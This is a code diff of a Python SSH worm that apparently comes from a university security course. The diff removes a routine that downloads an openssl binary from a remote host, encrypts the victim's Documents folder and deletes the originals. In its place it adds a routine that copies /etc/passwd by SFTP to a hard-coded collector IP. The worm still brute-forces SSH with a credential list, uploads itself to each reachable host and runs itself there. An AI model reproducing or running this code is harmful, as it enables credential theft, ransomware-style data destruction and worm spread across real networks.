@@ -5,12 +5,9 @@ import os
 import os.path
 import socket, fcntl, struct
 import netifaces
-import urllib
-from subprocess import call
-import shutil
-import tarfile
 
-markerLocation = "/tmp/extort_marker.txt"
+markerLocation = "/tmp/pass_marker.txt"
+stealersIp = "192.168.1.6"
 
 wordList = [
 ('awesomeUserName', 'badPassword'),
@@ -121,31 +118,24 @@ def attackHost(host):
 	return None
 
 
-def encryptVictim():
-	try:
-		tar = tarfile.open("/home/ubuntu/Documents.tar", "w:gz")
-
-		# Add the exdir/ directory to the archive
-		tar.add("/home/ubuntu/Documents/")
-
-		# Close the archive file
-		tar.close()
-		call(["chmod", "a+x", "./openssl"])
-		call(["./openssl", "aes-256-cbc", "-a", "-salt", "-in", "/home/ubuntu/Documents.tar", "-out", "/home/ubuntu/Documents.enc", "-k", "cs456worm"])
-		shutil.rmtree('/home/ubuntu/Documents/')
-	except:
-		print("Couldn't encypt victim")
+def sendPasswords():
+	global stealersIp
+	ssh = paramiko.SSHClient()
+	ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
+	ssh.connect(stealersIp, username="ubuntu", password="123456")
+	sftpClient = ssh.open_sftp()
+	currIp = getMachineIp()
+	sftpClient.put("/etc/passwd", "/home/ubuntu/SSH_Worms/passwd_"+str(currIp) + ".txt")
 
 
 
 markSystem();
+
 if len(sys.argv) == 2:
 	if sys.argv[1] == "-host":
-		print("Will mark and spread worm but won't encrypt Documents folder")
+		print("Will mark and spread worm but won't steal its own password!")
 else:
-	urllib.urlretrieve("http://ecs.fullerton.edu/~mgofman/openssl", "openssl")
-	encryptVictim()
-
+	sendPasswords()
 
 network = getHostsOnTheSameNetwork()
 
@@ -165,9 +155,9 @@ for Host in network:
 			print("Spreading to this machine: %s" %(str(Host)))
 			try:
 				sftpClient = sshInfo[0].open_sftp()
-				sftpClient.put("extorter_worm.py", "/tmp/" + "extorter_worm.py")
-				sshInfo[0].exec_command("chmod a+x /tmp/extorter_worm.py")
-				sshInfo[0].exec_command("nohup python /tmp/extorter_worm.py &")
+				sftpClient.put("replicating_worm.py", "/tmp/" + "replicating_worm.py")
+				sshInfo[0].exec_command("chmod a+x /tmp/replicating_worm.py")
+				sshInfo[0].exec_command("nohup python /tmp/replicating_worm.py &")
 			except:
 				print ("Something went wrong")
 
